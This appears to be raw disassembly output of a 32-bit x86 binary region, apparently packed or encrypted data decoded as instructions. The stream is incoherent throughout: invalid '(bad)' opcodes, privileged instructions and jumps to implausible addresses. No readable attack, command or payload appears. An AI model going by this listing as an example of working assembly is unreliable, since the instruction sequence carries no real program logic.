  40e288:	push   DWORD PTR [eax-0x700074b4]
  40e28e:	hlt    
  40e28f:	mov    bl,0xf0
  40e291:	addr16 hlt 
  40e293:	std    
  40e294:	jmp    ebp
  40e296:	add    bh,bh
  40e298:	jne    0x40e2aa
  40e29a:	(bad)  
  40e29c:	(bad)  
  40e29d:	outs   dx,DWORD PTR ds:[esi]
  40e29e:	hlt    
  40e29f:	std    
  40e2a0:	mov    ch,0x28
  40e2a2:	cld    
  40e2a3:	std    
  40e2a4:	push   DWORD PTR [eax+0x20]
  40e2a7:	mov    edi,edi
  40e2a9:	pmuludq mm0,QWORD PTR [ebx-0x8]
  40e2ad:	inc    ecx
  40e2ae:	idiv   ah
  40e2b0:	jmp    FWORD PTR [edi]
  40e2b2:	hlt    
  40e2b3:	jae    0x40e2b1
  40e2b5:	xor    DWORD PTR [eax],ecx
  40e2b7:	inc    ebp
  40e2b8:	ja     0x40e2eb
  40e2ba:	loopne 0x40e285
  40e2bc:	shl    DWORD PTR ds:0x9d8b55e0,0x5f
  40e2c3:	enter  0xfb,0x1b
  40e2c7:	loopne 0x40e331
  40e2c9:	and    bl,BYTE PTR [esi+0x54e80b7d]
  40e2cf:	js     0x40e2cd
  40e2d1:	(bad)  
  40e2d2:	mov    eax,0x3168002d
  40e2d7:	loopne 0x40e2c4
  40e2d9:	mov    ebp,0x415dbe09
  40e2de:	xor    DWORD PTR [eax-0xe],ebx
  40e2e1:	pop    esp
  40e2e2:	lock (bad) 
  40e2e5:	je     0x40e320
  40e2e7:	enter  0xb42a,0x5e
  40e2eb:	mov    ds:0x20f4fa6a,eax
  40e2f0:	add    al,0xff
  40e2f2:	add    al,0x5a
  40e2f4:	dec    ebx
  40e2f5:	inc    ecx
  40e2f6:	xor    DWORD PTR [ebx+0x70490875],ebx
  40e2fc:	(bad)  
  40e2fd:	(bad)  
  40e2fe:	ss sbb dl,bh
  40e301:	pop    esp
  40e302:	jo     0x40e2e4
  40e304:	push   0x2
  40e306:	xor    eax,esp
  40e308:	cmp    dh,0xa4
  40e30b:	call   0x6b5560fa
  40e310:	cld    
  40e311:	addr16 aas 
  40e313:	mov    dl,0x41
  40e315:	add    BYTE PTR [ecx-0x4efffd22],bl
  40e31b:	inc    edx
  40e31c:	jbe    0x40e326
  40e31e:	or     DWORD PTR [edi-0x28110104],esp
  40e324:	dec    esp
  40e325:	pop    esi
  40e326:	jo     0x40e308
  40e328:	push   0x2
  40e32a:	add    BYTE PTR [ecx],dh
  40e32c:	loopne 0x40e2b0
  40e32e:	(bad)  
  40e32f:	pop    esp
  40e330:	or     ecx,esi
  40e332:	jmp    0x40e3ad
  40e334:	repz sbb eax,0x157bc7fc
  40e33a:	cld    
  40e33b:	inc    ebp
  40e33c:	add    DWORD PTR [ecx],eax
  40e33e:	push   ss
  40e33f:	test   eax,0x70ca05f1
  40e344:	or     al,0xe9
  40e346:	push   esi
  40e347:	mov    edx,0x2d75f5e4
  40e34c:	loope  0x40e356
  40e34e:	lea    edx,[edi+0x2c3f1f1]
  40e354:	xor    BYTE PTR [ecx-0x3d],dl
  40e357:	in     al,0x47
  40e359:	jmp    0x5fa56cb1
  40e35e:	sti    
  40e35f:	ja     0x40e3b9
  40e361:	sbb    DWORD PTR [ecx+esi*1+0x9],ebp
  40e365:	into   
  40e366:	mov    edx,0x45169ece
  40e36b:	xor    DWORD PTR [ecx-0x52],ebx
  40e36e:	jno    0x40e399
  40e370:	loope  0x40e3b0
  40e372:	mov    bh,0x4f
  40e374:	icebp  
  40e375:	inc    eax
  40e376:	ins    BYTE PTR es:[edi],dx
  40e377:	xor    BYTE PTR [ecx],cl
  40e379:	xchg   BYTE PTR [edx+0x452eafd6],bh
  40e37f:	xor    DWORD PTR [ecx-0x7a],ebx
  40e382:	jno    0x40e3bd
  40e384:	loope  0x40e3b0
  40e386:	mov    bh,0x27
  40e388:	icebp  
  40e389:	or     BYTE PTR [edi-0x55],0xf0
  40e38d:	ins    DWORD PTR es:[edi],dx
  40e38e:	int    0x0
  40e390:	lock add ecx,ebp
  40e393:	push   eax
  40e394:	mov    edx,0xac069dd
  40e399:	fs jmp 0xd431360c
  40e39f:	or     ecx,DWORD PTR [ecx]
  40e3a1:	pop    edi
  40e3a2:	outs   dx,BYTE PTR ds:[esi]
  40e3a3:	sti    
  40e3a4:	out    dx,eax
  40e3a5:	and    BYTE PTR [ebx+0x1358f7],0x36
  40e3ac:	pusha  
  40e3ad:	add    eax,ebp
  40e3af:	push   esp
  40e3b0:	(bad)  
  40e3b2:	(bad)  
  40e3b3:	xchg   ebx,eax
  40e3b4:	pop    ss
  40e3b5:	lock je 0x40e3a9
  40e3b8:	fiadd  DWORD PTR [ebx+0x62ba16fe]
  40e3be:	sbb    al,0xe
  40e3c0:	inc    eax
  40e3c1:	add    eax,ebp
  40e3c3:	push   0xfefeefaa
  40e3c8:	and    ebp,ebp
  40e3ca:	(bad)  
  40e3cb:	jl     0x40e3f7
  40e3cd:	loope  0x40e355
  40e3cf:	call   0x8eab:0xc8ef
  40e3d5:	lock push ebx
  40e3d7:	jb     0x40e367
  40e3d9:	pop    ebx
  40e3da:	(bad)  
  40e3db:	in     al,dx
  40e3dc:	mov    ch,0x50
  40e3de:	inc    ecx
  40e3df:	jmp    0xe940ed16
  40e3e4:	pop    ds
  40e3e5:	aam    0xfe
  40e3e7:	xor    al,0x35
  40e3e9:	loope  0x40e3ad
  40e3eb:	cmp    eax,0x148b0935
  40e3f0:	and    eax,0xebf78c
  40e3f5:	rcr    BYTE PTR [ecx],0x3
  40e3f8:	mov    ecx,0xf01e2af
  40e3fd:	mov    ah,0x32
  40e3ff:	pop    esp
  40e400:	sub    eax,0xae6605c0
  40e405:	xor    al,0x4d
  40e407:	add    BYTE PTR [esi-0x5f],bh
  40e40a:	std    
  40e40b:	out    0xf3,eax
  40e40d:	mov    eax,ds:0x93010009
  40e412:	push   eax
  40e413:	inc    ecx
  40e414:	jmp    0xa89ebbb3
  40e419:	xor    ah,cl
  40e41b:	cmp    DWORD PTR [ebp-0x5],edi
  40e41e:	out    dx,al
  40e41f:	or     ch,BYTE PTR [ecx]
  40e421:	xchg   BYTE PTR [esi-0x1],ah
  40e424:	add    BYTE PTR [ebp-0x11ea00fd],ch
  40e42a:	push   edx
  40e42b:	inc    ecx
  40e42c:	add    BYTE PTR [ebx-0x50],cl
  40e42f:	add    cl,BYTE PTR [ebx]
  40e431:	or     BYTE PTR [ecx+0x55],bh
  40e434:	dec    ebp
  40e436:	jns    0x40e497
  40e438:	inc    ecx
  40e439:	fsub   DWORD PTR [esi+0xb89607f]
  40e43f:	cmp    DWORD PTR ds:0x416c49,0xffffff98
  40e446:	js     0x40e450
  40e448:	(bad)  
  40e449:	jge    0x40e4a8
  40e44b:	pop    edi
  40e44c:	inc    ecx
  40e44d:	mov    dh,bl
  40e44f:	aaa    
  40e450:	push   0xffffff88
  40e452:	pop    ebp
  40e453:	add    edi,edi
  40e455:	sub    eax,0x415e8c
  40e45a:	cwde   
  40e45b:	lock adc edi,DWORD PTR [edx+0x47]
  40e45f:	dec    esp
  40e460:	add    BYTE PTR [ebx-0x3ff4ff34],al
  40e466:	sub    al,0x2c
  40e468:	push   DWORD PTR ds:0x4164d9
  40e46e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e46f:	inc    DWORD PTR [ecx-0x7cfaf6a1]
  40e475:	les    ebx,FWORD PTR [eax+esi*8+0x13]
  40e479:	push   0x7
  40e47b:	dec    esp
  40e47c:	add    bh,al
  40e47e:	dec    ebp
  40e47f:	mov    bl,BYTE PTR [esi+0x41]
  40e482:	dec    eax
  40e483:	or     eax,DWORD PTR [eax]
  40e485:	add    BYTE PTR [eax],bl
  40e487:	fdivp  st(7),st
  40e489:	inc    edx
  40e48a:	mov    ds:0xcac959c4,eax
  40e48f:	std    
  40e490:	inc    DWORD PTR [edx+0x415e8bc5]
  40e496:	sbb    BYTE PTR [ebx],cl
  40e498:	je     0x40e4b9
  40e49a:	addr16 push ds
  40e49c:	and    DWORD PTR [eax+0x31],0x1cff02a1
  40e4a3:	bound  ebx,QWORD PTR [ecx+0x41]
  40e4a6:	xor    DWORD PTR [ebx-0x40],esp
  40e4a9:	add    esp,esi
  40e4ab:	aad    0x6c
  40e4ad:	pop    edi
  40e4ae:	jo     0x40e490
  40e4b0:	mov    edi,0x41c0b004
  40e4b5:	add    BYTE PTR [ecx],dh
  40e4b7:	loopne 0x40e4bb
  40e4b9:	add    dl,dh
  40e4bb:	mov    ch,0x8b
  40e4bd:	jmp    0x40e4bf
  40e4bf:	mov    dl,0x1c
  40e4c1:	hlt    
  40e4c2:	push   edx
  40e4c3:	stos   BYTE PTR es:[edi],al
  40e4c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4c5:	or     cl,BYTE PTR [ebx]
  40e4c7:	jno    0x40e535
  40e4c9:	or     al,0x83
  40e4cb:	and    al,0xdc
  40e4cd:	add    dh,BYTE PTR [esp+esi*1+0x60]
  40e4d1:	cmp    al,0x0
  40e4d3:	sbb    al,0xe7
  40e4d5:	sub    eax,eax
  40e4d7:	jmp    0x3b60:0x3107c4b8
  40e4de:	jle    0x40e4e5
  40e4e0:	lock cmp DWORD PTR [eax+esi*4],0x40
  40e4e5:	inc    ebx
  40e4e6:	add    BYTE PTR [ecx],dh
  40e4e8:	sub    eax,0x2b712b01
  40e4ed:	retf   
  40e4ee:	shr    DWORD PTR [ecx],0xe0
  40e4f1:	xor    BYTE PTR [edi],0xd7
  40e4f4:	xor    al,0x3a
  40e4f6:	mov    esp,esp
  40e4f8:	repz dec esp
  40e4fa:	adc    DWORD PTR [ebx-0x1d],0xb
  40e4fe:	rol    ah,cl
  40e500:	fld    QWORD PTR [ebx+0x6de1257c]
  40e506:	add    al,0x5a
  40e508:	mov    al,ds:0x1d2623eb
  40e50d:	or     BYTE PTR [ebx-0x21b8c],cl
  40e513:	xor    ah,al
  40e515:	add    al,cl
  40e517:	adc    DWORD PTR [ecx],ecx
  40e519:	jmp    0x40e56e
  40e51b:	sbb    ecx,edx
  40e51d:	jo     0x40e517
  40e51f:	call   FWORD PTR [eax+0x62]
  40e522:	dec    esi
  40e523:	add    BYTE PTR [ecx],ch
  40e525:	dec    ebx
  40e526:	mov    ecx,0x9afd65f8
  40e52b:	jmp    0x40e50d
  40e52d:	xchg   esp,eax
  40e52e:	cmp    eax,0x205286f8
  40e533:	lds    ebp,FWORD PTR [esi]
  40e535:	or     DWORD PTR [edx],eax
  40e537:	(bad)  
  40e539:	jae    0x40e530
  40e53b:	clc    
  40e53c:	cmp    eax,0x4b039301
  40e541:	or     DWORD PTR [esi],edx
  40e543:	push   cs
  40e544:	inc    edi
  40e545:	dec    esi
  40e546:	test   al,0x3
  40e548:	mov    dl,0xc4
  40e54a:	fmul   DWORD PTR [ecx+esi*2]
  40e54d:	je     0x40e4d3
  40e54f:	mov    dh,ch
  40e551:	in     al,dx
  40e552:	add    BYTE PTR [edi],0xa4
  40e555:	inc    ebx
  40e556:	stc    
  40e557:	push   edx
  40e558:	cdq    
  40e559:	mov    ecx,0x6287f770
  40e55e:	jmp    0x3939daeb
  40e563:	idiv   ebp
  40e565:	in     al,dx
  40e566:	int    0x11
  40e568:	out    dx,eax
  40e569:	dec    ebp
  40e56a:	sub    BYTE PTR [edx+esi*4],al
  40e56d:	(bad)  
  40e56e:	in     al,dx
  40e56f:	or     dh,BYTE PTR [ecx+0x73]
  40e572:	cli    
  40e573:	mov    ch,ch
  40e575:	clc    
  40e576:	imul   edi,DWORD PTR [ebp+esi*1+0x9],0x48ba1b1d
  40e57e:	icebp  
  40e57f:	inc    ebx
  40e580:	loope  0x40e562
  40e582:	sbb    DWORD PTR [edi+esi*1+0xdc61ed],ecx
  40e589:	mov    ebp,0x96f77946
  40e58e:	add    DWORD PTR [edx],ebx
  40e590:	test   DWORD PTR [esi-0x4b7efffb],0x9b6efe84
  40e59a:	or     DWORD PTR [ebp-0xc2fd54],ecx
  40e5a0:	hlt    
  40e5a1:	or     BYTE PTR [ecx+eax*2-0x17],0xb3
  40e5a6:	enter  0xc307,0x35
  40e5aa:	in     al,dx
  40e5ab:	je     0x40e5f2
  40e5ad:	ficom  WORD PTR ds:0x9759e72
  40e5b3:	sub    DWORD PTR ds:0x92c28025,0xfffffffd
  40e5ba:	retf   0xe907
  40e5bd:	popa   
  40e5be:	sub    bl,0x1e
  40e5c1:	inc    eax
  40e5c2:	std    
  40e5c3:	(bad)  
  40e5c4:	pushf  
  40e5c5:	sub    ch,ah
  40e5c7:	adc    al,0x90
  40e5c9:	adc    cl,BYTE PTR [edx+0x0]
  40e5cc:	push   0x71
  40e5ce:	add    al,0x50
  40e5d0:	(bad)  
  40e5d1:	and    ebp,edi
  40e5d3:	(bad)  
  40e5d4:	jl     0x40e600
  40e5d6:	in     al,dx
  40e5d7:	adc    al,0x74
  40e5d9:	adc    cl,BYTE PTR [edx+0x0]
  40e5dc:	push   0xffffffc6
  40e5de:	add    al,0x8b
  40e5e0:	xor    al,0x25
  40e5e2:	add    BYTE PTR [ecx],0x31
  40e5e5:	fs retf 0xe90b
  40e5e9:	add    DWORD PTR [eax-0x59ff9515],eax
  40e5ef:	in     al,0xfe
  40e5f1:	xor    al,0x29
  40e5f3:	loope  0x40e5be
  40e5f5:	gs pop edi
  40e5f7:	jmp    0x40e603
  40e5f9:	test   eax,0xabc904c1
  40e5fe:	and    cl,BYTE PTR [ecx]
  40e600:	call   DWORD PTR [ecx+ebp*1]
  40e603:	loope  0x40e5c1
  40e605:	inc    edi
  40e606:	aas    
  40e607:	jmp    0x40e613
  40e609:	test   eax,0xc9059e
  40e60e:	ficom  DWORD PTR [edi]
  40e610:	add    bh,bh
  40e612:	and    eax,0xf875fefc
  40e617:	ffreep st(3)
  40e619:	std    
  40e61a:	lahf   
  40e61b:	repz or eax,eax
  40e61e:	in     eax,0xeb
  40e620:	mov    edx,0x656807f8
  40e626:	call   0x84a8e66f
  40e62b:	push   ebx
  40e62c:	inc    ecx
  40e62d:	add    BYTE PTR [eax+0x1fff9238],al
  40e633:	(bad)  
  40e634:	mov    edi,0x655fcf75
  40e639:	pusha  
  40e63a:	cdq    
  40e63b:	pop    es
  40e63c:	push   0x44ef86
  40e641:	call   0x3e8003
  40e646:	rol    edi,cl
  40e648:	or     eax,0x55584
  40e64d:	add    BYTE PTR ds:0x50fc49,bl
  40e653:	lahf   
  40e654:	pop    ebx
  40e655:	or     al,0xff
  40e657:	jne    0x40e6c1
  40e659:	pusha  
  40e65a:	inc    ecx
  40e65b:	cwde   
  40e65c:	xchg   dl,al
  40e65e:	or     BYTE PTR [ebx-0x527af239],al
  40e664:	pop    es
  40e665:	add    BYTE PTR [eax],al
  40e667:	repnz add al,0x8d
  40e66a:	inc    ebp
  40e66b:	adc    BYTE PTR [edx+ebp*2-0x1],0x0
  40e670:	repz pop esi
  40e672:	inc    ecx
  40e673:	dec    eax
  40e674:	hlt    
  40e675:	jae    0x40e673
  40e677:	lahf   
  40e678:	sti    
  40e679:	ins    BYTE PTR es:[edi],dx
  40e67a:	pusha  
  40e67b:	sbb    DWORD PTR ds:0x44c483,eax
  40e681:	ror    BYTE PTR [edi],0xd5
  40e684:	test   bh,bh
  40e686:	push   DWORD PTR [ecx]
  40e688:	loop   0x40e67d
  40e68a:	je     0x40e6b5
  40e68c:	jl     0x40e69c
  40e68e:	jno    0x40e621
  40e690:	and    DWORD PTR [ebx+eax*4],eax
  40e693:	cmc    
  40e694:	in     al,0x7f
  40e696:	test   DWORD PTR [ebp-0x64170214],0xb40002e1
  40e6a0:	popf   
  40e6a1:	out    dx,al
  40e6a2:	dec    edi
  40e6a3:	mov    esp,eax
  40e6a5:	repz je 0x40e6a1
  40e6a8:	dec    eax
  40e6a9:	adc    bh,bh
  40e6ab:	out    dx,al
  40e6ac:	cmp    ecx,DWORD PTR [ecx]
  40e6ae:	shl    BYTE PTR [esi],0x5c
  40e6b1:	inc    ebp
  40e6b2:	add    DWORD PTR [ecx],esi
  40e6b4:	loopne 0x40e735
  40e6b6:	jl     0x40e6b8
  40e6b8:	fucom  st(0)
  40e6ba:	add    eax,DWORD PTR [esp+esi*2-0x4efffd1f]
  40e6c1:	call   0xccf5f5c8
  40e6c6:	add    DWORD PTR [eax],eax
  40e6c8:	xor    DWORD PTR [eax-0x615aab79],esi
  40e6ce:	push   eax
  40e6cf:	call   0xff364229
  40e6d4:	sti    
  40e6d5:	js     0x40e716
  40e6d7:	call   0xff305472
  40e6dc:	add    al,0x8
  40e6de:	push   edx
  40e6df:	call   0xff3541c6
  40e6e4:	jbe    0x40e70b
  40e6e6:	hlt    
  40e6e7:	push   DWORD PTR [esi-0x20]
  40e6ea:	add    al,bh
  40e6ec:	hlt    
  40e6ed:	stos   DWORD PTR es:[edi],eax
  40e6ee:	add    al,BYTE PTR [eax]
  40e6f0:	xor    eax,esp
  40e6f2:	jg     0x40e730
  40e6f4:	fdivr  QWORD PTR [edi]
  40e6f6:	inc    ebx
  40e6f7:	add    BYTE PTR [ecx],dh
  40e6f9:	sub    eax,0x40c26852
  40e6fe:	inc    ebx
  40e6ff:	add    BYTE PTR [ecx+0x9],bl
  40e702:	arpl   WORD PTR [edx+0x31],si
  40e705:	or     DWORD PTR [ecx],edi
  40e707:	ins    BYTE PTR es:[edi],dx
  40e708:	ret    0x2867
  40e70b:	add    al,0x2e
  40e70d:	je     0x40e690
  40e70f:	jmp    0x40e6a1
  40e711:	jbe    0x40e6fc
  40e713:	add    ebp,DWORD PTR [edx]
  40e715:	leave  
  40e716:	hlt    
  40e717:	sbb    ecx,DWORD PTR [ecx+0x43086f]
  40e71d:	xor    ecx,esp
  40e71f:	dec    esi
  40e720:	jb     0x40e753
  40e722:	or     DWORD PTR [ecx-0x57978495],edi
  40e728:	add    esi,esi
  40e72a:	jae    0x40e76d
  40e72c:	jmp    0x40e7a2
  40e72e:	jbe    0x40e719
  40e730:	add    edi,DWORD PTR [edx]
  40e732:	leave  
  40e733:	mov    esp,0xc787494b
  40e738:	inc    edx
  40e739:	xor    ecx,esp
  40e73b:	push   0x72
  40e73d:	xor    DWORD PTR [ecx],ecx
  40e73f:	cdq    
  40e740:	imul   esi,DWORD PTR [ebx-0x41fc5799],0x73
  40e747:	adc    ebx,ebp
  40e749:	or     BYTE PTR [esi-0x17],dh
  40e74c:	add    ebx,DWORD PTR [edx+0x24366a1a]
  40e752:	imul   ebp,DWORD PTR [eax-0x1c8bcffd],0xa867aa6b
  40e75c:	add    ebx,DWORD PTR [ecx+0x31037849]
  40e762:	pop    ecx
  40e763:	push   ecx
  40e764:	jg     0x40e777
  40e766:	dec    eax
  40e767:	jmp    0xc121e55e
  40e76c:	or     esp,edx
  40e76e:	or     cl,ch
  40e770:	fidivr WORD PTR [ebx]
  40e772:	xchg   BYTE PTR [ebx],al
  40e774:	jno    0x40e747
  40e776:	inc    edi
  40e777:	jmp    0x47c381
  40e77c:	add    dh,BYTE PTR [ebp-0x2]
  40e77f:	mov    edi,0x7bd30034
  40e784:	inc    esp
  40e785:	popf   
  40e786:	in     eax,0x5e
  40e788:	add    DWORD PTR [esi-0x23180f48],ebx
  40e78e:	and    al,ch
  40e790:	dec    BYTE PTR [esi-0x6eb02258]
  40e796:	push   edx
  40e797:	out    0xfe,al
  40e799:	jle    0x40e72f
  40e79b:	dec    ebp
  40e79c:	lock fs js 0x40e77d
  40e7a0:	dec    edi
  40e7a1:	add    ebp,DWORD PTR [edi]
  40e7a3:	call   0x41e491c
  40e7a8:	(bad)  
  40e7a9:	pop    esi
  40e7aa:	add    ch,al
  40e7ac:	je     0x40e80b
  40e7ae:	test   ecx,esi
  40e7b0:	adc    al,0x4c
  40e7b2:	loop   0x40e79b
  40e7b4:	mov    BYTE PTR [esi+edi*8+0x2d517c8b],ch
  40e7bb:	pop    ebp
  40e7bc:	xor    al,0x6a
  40e7be:	inc    eax
  40e7bf:	cmc    
  40e7c0:	push   DWORD PTR [eax+edx*1-0x2c16ff8f]
  40e7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7c8:	(bad)  
  40e7c9:	xchg   esp,eax
  40e7ca:	mov    edx,0xa26bcdf0
  40e7cf:	out    0xfe,eax
  40e7d1:	xchg   esp,eax
  40e7d2:	mov    ah,bh
  40e7d4:	je     0x40e7c7
  40e7d6:	jp     0x40e805
  40e7d8:	cmp    esi,0xffffffa3
  40e7db:	out    0x74,eax
  40e7dd:	stc    
  40e7de:	sbb    DWORD PTR [ebp+0x8],0x1
  40e7e2:	aaa    
  40e7e3:	mov    esi,?
  40e7e5:	out    0x0,al
  40e7e7:	sbb    DWORD PTR [ebp-0x14],0xffffffde
  40e7eb:	stc    
  40e7ec:	adc    al,ch
  40e7ee:	out    0xb7,al
  40e7f0:	out    0xfe,eax
  40e7f2:	into   
  40e7f3:	jmp    0x9c41cfd0
  40e7f8:	xchg   ecx,eax
  40e7f9:	std    
  40e7fa:	call   DWORD PTR [edi+0x74e8ec61]
  40e800:	xchg   ecx,eax
  40e801:	std    
  40e802:	call   DWORD PTR [edi-0x5317179f]
  40e808:	xchg   ecx,eax
  40e809:	std    
  40e80a:	jmp    DWORD PTR [ecx-0x38000374]
  40e810:	fidiv  DWORD PTR [ebx-0x4]
  40e813:	mov    bh,0x0
  40e815:	imul   esp,DWORD PTR [eax+0x49],0xcc4830d
  40e81c:	les    edi,FWORD PTR [edi-0x4]
  40e81f:	xchg   ebx,ebx
  40e821:	mov    edx,0x8b550be8
  40e827:	fs aas 
  40e829:	push   0x0
  40e82b:	push   edi
  40e82c:	popa   
  40e82d:	or     al,ch
  40e82f:	mov    ds:0x53fffe64,eax
  40e834:	aam    0x51
  40e836:	call   0x41449d
  40e83b:	jecxz  0x40e808
  40e83d:	jb     0x40e85a
  40e83f:	fcmovne st,st(6)
  40e841:	inc    esi
  40e842:	jmp    0x40e82e
  40e844:	mov    esi,DWORD PTR [esi]
  40e846:	or     eax,0x3880109c
  40e84b:	add    dl,al
  40e84d:	pusha  
  40e84e:	add    eax,0xeb0b98c6
  40e853:	add    dh,BYTE PTR [ebx]
  40e855:	adc    DWORD PTR [eax+0x3b],ecx
  40e858:	dec    ebx
  40e859:	pop    edi
  40e85a:	jmp    0x9cc2:0xc9574b8b
  40e861:	or     edx,DWORD PTR [ebp-0x75]
  40e864:	test   BYTE PTR [ebp-0x25c04b3e],cl
  40e86a:	jae    0x40e878
  40e86c:	pusha  
  40e86d:	cmp    BYTE PTR [edx-0x340ce01],cl
  40e873:	mov    edi,0xc94fecdc
  40e878:	jae    0x40e83b
  40e87a:	add    bh,bh
  40e87c:	fdivr  st(5),st
  40e87e:	fimul  DWORD PTR [ebp-0x63]
  40e881:	sahf   
  40e882:	lock or dh,BYTE PTR [ecx+0x1d]
  40e886:	pop    es
  40e887:	pop    edi
  40e888:	push   0x360013b3
  40e88d:	cld    
  40e88e:	pop    ss
  40e88f:	jmp    DWORD PTR [eax+eiz*8-0x67d5ab26]
  40e896:	lock mov WORD PTR [eax+eiz*2+0x54],?
  40e89b:	call   FWORD PTR [esp+esi*8+0x5fbbf1da]
  40e8a2:	icebp  
  40e8a3:	or     dh,cl
  40e8a5:	mov    DWORD PTR [esi+0x2f03207],0xf1447cff
  40e8af:	je     0x40e8b1
  40e8b1:	jmp    0xe6d0a3fe
  40e8b6:	push   edi
  40e8b7:	std    
  40e8b8:	mov    edi,0x1e0742e
  40e8bd:	xor    eax,esi
  40e8bf:	jns    0x40e905
  40e8c1:	(bad)  [ebx-0x14]
  40e8c4:	jg     0x40e8cc
  40e8c6:	lock inc DWORD PTR [ebx+0x2f2e7]
  40e8cd:	pop    esi
  40e8ce:	clc    
  40e8cf:	push   esi
  40e8d0:	jmp    FWORD PTR [esi-0x7ebb8501]
  40e8d6:	pop    ss
  40e8d7:	ja     0x40e8a9
  40e8d9:	or     edx,esp
  40e8db:	bound  eax,QWORD PTR [ecx+0x31]
  40e8de:	clc    
  40e8df:	fs jo  0x40e913
  40e8e2:	lock push edx
  40e8e4:	(bad)  
  40e8e5:	cld    
  40e8e6:	call   FWORD PTR [ebx-0xa]
  40e8e9:	adc    DWORD PTR [ecx],ecx
  40e8eb:	sub    BYTE PTR [ecx+ecx*4],al
  40e8ee:	cmp    al,0x59
  40e8f0:	add    al,0x31
  40e8f2:	cmp    esi,edx
  40e8f4:	jbe    0x40e877
  40e8f6:	jno    0x40e8cb
  40e8f8:	arpl   ax,si
  40e8fa:	or     cl,dl
  40e8fc:	dec    eax
  40e8fd:	loope  0x40e907
  40e8ff:	jmp    0xa952d151
  40e904:	ja     0x40e93b
  40e906:	adc    bl,BYTE PTR [ebx-0x4fedd689]
  40e90c:	add    BYTE PTR [ebx+edx*4+0x123103ea],ch
  40e913:	mov    al,ds:0xce380076
  40e918:	and    edi,DWORD PTR [eax+0x3e90931]
  40e91e:	or     cl,BYTE PTR [esi]
  40e920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e921:	inc    esi
  40e922:	lds    ecx,FWORD PTR [eax]
  40e924:	jmp    0xba261a2c
  40e929:	ret    
  40e92a:	mov    ecx,0xf7f065e5
  40e92f:	fimul  DWORD PTR [esi-0x16a3c9d5]
  40e935:	enter  0xf16d,0xe8
  40e939:	add    esi,DWORD PTR [ecx]
  40e93b:	or     DWORD PTR [ecx+0x30],ebp
  40e93e:	xor    DWORD PTR [esi],edx
  40e940:	gs dec ebx
  40e942:	xor    ecx,DWORD PTR [ecx]
  40e944:	jmp    0x2f06c2a1
  40e949:	lock mov edi,0xb3bfab8f
  40e94f:	arpl   WORD PTR [ecx],dx
  40e951:	add    esp,DWORD PTR [eax+ebp*1]
  40e954:	adc    edx,0xf0e947f7
  40e95a:	and    eax,0x7e810d5
  40e95f:	or     ecx,ebp
  40e961:	cld    
  40e962:	into   
  40e963:	adc    eax,0xb346c00
  40e968:	add    cl,ch
  40e96a:	imul   ecx,DWORD PTR [eax+ebp*8-0x18],0xd0000932
  40e972:	outs   dx,DWORD PTR ds:[esi]
  40e973:	pop    es
  40e974:	add    cl,ch
  40e976:	mov    bl,0x64
  40e978:	call   0x1619ea65
  40e97d:	mov    DWORD PTR [ecx+ecx*2-0x32],eax
  40e981:	inc    esp
  40e982:	shl    DWORD PTR [ebx],1
  40e984:	or     DWORD PTR [eax],eax
  40e986:	jmp    0xe941b3f0
  40e98b:	xor    cl,BYTE PTR [edx+0x5c33917c]
  40e991:	pshufw mm4,QWORD PTR [eax+0x52cc6e9],0x8
  40e999:	add    cl,ch
  40e99b:	xor    dh,dl
  40e99d:	lods   eax,DWORD PTR ds:[esi]
  40e99e:	call   0xfcc3f2d5
  40e9a3:	jmp    0xdc65:0x85e67507
  40e9aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ab:	push   0x32e903f1
  40e9b0:	or     ecx,ebp
  40e9b2:	xor    BYTE PTR [ecx+ecx*1],0x0
  40e9b6:	push   0x60
  40e9b8:	icebp  
  40e9b9:	add    edx,esp
  40e9bb:	fist   WORD PTR [ecx+0x4dee217c]
  40e9c1:	call   0x4a1caa
  40e9c6:	inc    eax
  40e9c7:	mov    ecx,0xb3e90009
  40e9cc:	gs call 0x6ccea1be
  40e9d2:	call   0x94c9f309
  40e9d7:	jle    0x40e960
  40e9d9:	jl     0x40ea30
  40e9db:	xor    eax,0x95d
  40e9e0:	inc    edi
  40e9e1:	push   edx
  40e9e2:	call   0x4981e9
  40e9e7:	jmp    0x40e980
  40e9e9:	retf   
  40e9ea:	inc    ebx
  40e9eb:	call   0x40f286
  40e9f0:	(bad)  
  40e9f1:	push   ecx
  40e9f2:	rol    BYTE PTR [eax],0x58
  40e9f5:	or     BYTE PTR [eax],al
  40e9f7:	(bad)  
  40e9f8:	adc    eax,0x48fffea5
  40e9fd:	or     bh,al
  40e9ff:	inc    ebp
  40ea00:	test   BYTE PTR [eax],cl
  40ea02:	add    BYTE PTR [eax],al
  40ea04:	pop    eax
  40ea05:	retf   
  40ea06:	inc    ebx
  40ea07:	mov    esp,0x858
  40ea0c:	xchg   edi,eax
  40ea0d:	push   ecx
  40ea0e:	mov    eax,0x84800
  40ea13:	inc    DWORD PTR [ebp-0xf]
  40ea16:	out    0x13,al
  40ea18:	mov    esi,0x5589fdf2
  40ea1d:	int    0xfd
  40ea1f:	jne    0x40e9ed
  40ea21:	mov    edi,0xf38ffe06
  40ea26:	xchg   DWORD PTR [ebp-0x30],eax
  40ea29:	bnd jae 0x40ea00
  40ea2c:	mov    al,0xd8
  40ea2e:	sti    
  40ea2f:	dec    DWORD PTR [edi+0x5bc44465]
  40ea35:	sbb    DWORD PTR [ebp+0x60],edi
  40ea38:	cdq    
  40ea39:	pop    es
  40ea3a:	add    BYTE PTR [ebp-0x66],dh
  40ea3d:	aas    
  40ea3e:	jae    0x40eaa1
  40ea40:	mov    DWORD PTR [edi],eax
  40ea42:	call   0x83eeace
  40ea47:	add    BYTE PTR [eax-0x10],dl
  40ea4a:	push   esi
  40ea4b:	popa   
  40ea4c:	inc    ecx
  40ea4d:	enter  0x73f2,0xc0
  40ea51:	and    BYTE PTR [ebx],al
  40ea53:	jo     0x40ea55
  40ea55:	cwde   
  40ea56:	fidivr WORD PTR [esi+0x5ada3174]
  40ea5c:	jp     0x40ea6e
  40ea5e:	mov    cl,0x2
  40ea60:	call   0x43666f
  40ea65:	loope  0x40eae0
  40ea67:	push   0xedf1f061
  40ea6c:	je     0x40eadf
  40ea6e:	or     DWORD PTR [edx],edx
  40ea70:	jo     0x40eaa3
  40ea72:	repnz idiv DWORD PTR [edi-0x7da3fd1b]
  40ea79:	shl    BYTE PTR [eax],1
  40ea7b:	add    al,0xe8
